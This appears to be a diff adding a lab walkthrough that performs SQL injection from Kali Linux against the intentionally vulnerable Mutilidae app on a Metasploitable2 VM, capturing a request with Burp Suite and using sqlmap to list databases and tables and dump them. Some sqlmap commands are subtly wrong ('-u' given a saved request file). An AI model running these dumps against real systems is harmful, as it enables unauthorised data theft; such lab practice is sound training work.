@@ -1,0 +1,38 @@
+The task is to perform an SQL Injection attack using Kali Linux
+
+
+Softwares Used: 
+
+VMWare Workstation 16 Pro 
+KaliLinux_2022.1_VM_Linux
+Metasploitable2-Linux
+
+-KaliLinux:
+1. default username & password: kalilinux
+2. Open terminal
+3. run command >>> ifconfig
+
+-Metasploitable2:
+4. default username & password: msfadmin
+5. run command >>> sudo ifconfig eth0 [inet obtained from kali linux(eth0)] subnet [subnet ip from kali linux(eth0)]
+6. Go to browser and run inet IP Address (example:192.168.174.128)
+7. Go to Mutilidae>OWASP Top 10> A1 Injection> SQLi Extract Data> User Info
+
+-Open BurpSuite in Kali Linux (It is pre-installed)
+8. Use default settings to start a new project
+9. Go to Proxy > Options & change the Proxy to you IP and Port 
+
+- Open Browser
+10. Change the proxy of your browser to the same settings as BurpSuite 
+11. Type in a random username and password in the User Info page
+12. Under the INTERCEPT Tab, following commands will be displayed, if not keep trying until the command " Upgrade-Insecure-Requests:1 " appears
+13. Save the logs in a text file on your Desktop
+14. Now go to Terminal (KaliLinux) and type: sqlmap -r /root/Desktop/filename.txt --dbs 
+15. You will be prompted with a command saying "there were multiple injection points. Please select one to use for injections" Use the default command here
+16. Available databases will be displayed
+17. Use Command: sqlmap -u /root/Desktop/filename.txt -D [database name] --tables
+18. Select default option i.e. 0
+19.Use Command: sqlmap -u /root/Desktop/filename.txt -T [tablename] --dump
+20. Select default option i.e. 0
+
+
